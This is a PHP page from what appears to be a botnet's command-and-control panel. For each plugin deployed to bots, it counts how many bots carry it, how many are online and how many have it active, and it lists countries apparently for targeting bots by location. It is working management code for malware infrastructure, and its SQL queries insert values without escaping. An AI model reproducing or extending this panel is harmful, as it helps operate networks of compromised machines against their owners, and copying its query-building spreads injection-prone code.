<?
	include_once "../common.php";
	include_once ROOT_PATH."/mod/geo.php";		
	if( !$user->Check() ) exit;

	$sql = "SELECT DISTINCT plugin FROM plugins";
	$res = $db->query($sql);

	if ((!$res) || !$db->affected_rows)
		die("<tr align='center'><td colspan='3' align='center'>There are <font style='color:red;'><b>no plugins</b></font></td></tr></table>");
	else
	{
		$pChecked = 'checked';
		$RES = array();
		for ($i = 0; $mres = $res->fetch_array(); $i++) 
		{
			$plugin = $mres[0];
		
			$sql = "SELECT COUNT(*) FROM plugins WHERE plugin = '$plugin'";
			$res2 = $db->query($sql);
			if (!$res2)	continue;
			list($cnt) = $res2->fetch_array();
			if (!$cnt) continue;
			
			$sql = "SELECT COUNT(*) FROM bots_t, plugins WHERE status_bot = 'online' AND plugins.plugin = '$plugin' 
					AND bots_t.id_bot = plugins.fk_bot";
			$res2 = $db->query($sql);
			list($cntonline) = $res2->fetch_array();
			
			$sql = "SELECT COUNT(*) FROM bots_t, plugins WHERE status = 1 AND status_bot = 'online' AND plugins.plugin = '$plugin' 
					AND bots_t.id_bot = plugins.fk_bot";
			$res2 = $db->query($sql);
			list($cntactonline) = $res2->fetch_array();
		
			$RES[] = array('PCHECKED'=>$pChecked, 'PLUGIN'=>$plugin, 'I'=>$i, 'CNTACTONLINE'=>$cntactonline, 'CNTONLINE'=>$cntonline, 'CNT'=>$cnt);
			$pChecked = '';
		}
		$smarty->assign('CONT_ARR', $RES);
	}

	$res = $db->query("SELECT count(*) FROM country_t");
	$mres = $res->fetch_array();
	$num = ceil($mres[0]/3);

	$RES2 = array();
	for ($i=0; $i<3; $i++) 
	{
		$start = $i*$num;
		$res = $db->query("SELECT * FROM country_t ORDER BY name_country limit $start, $num");
		$ELEM = array();
		while ($mres = $res->fetch_array()) 
		{
			$ccode = 'null';
			$ccode = CountryCode($mres['name_country']);
			$ELEM[] = array('MRES_IC'=>$mres['id_country'], 'MRES_NAME'=>$mres['name_country'], 'CCODE'=>$ccode);
		}
		$RES2[] = $ELEM;
	}
	$smarty->assign('CONT_ARR2', $RES2);
	
	$smarty->display('plugins.tpl');
?>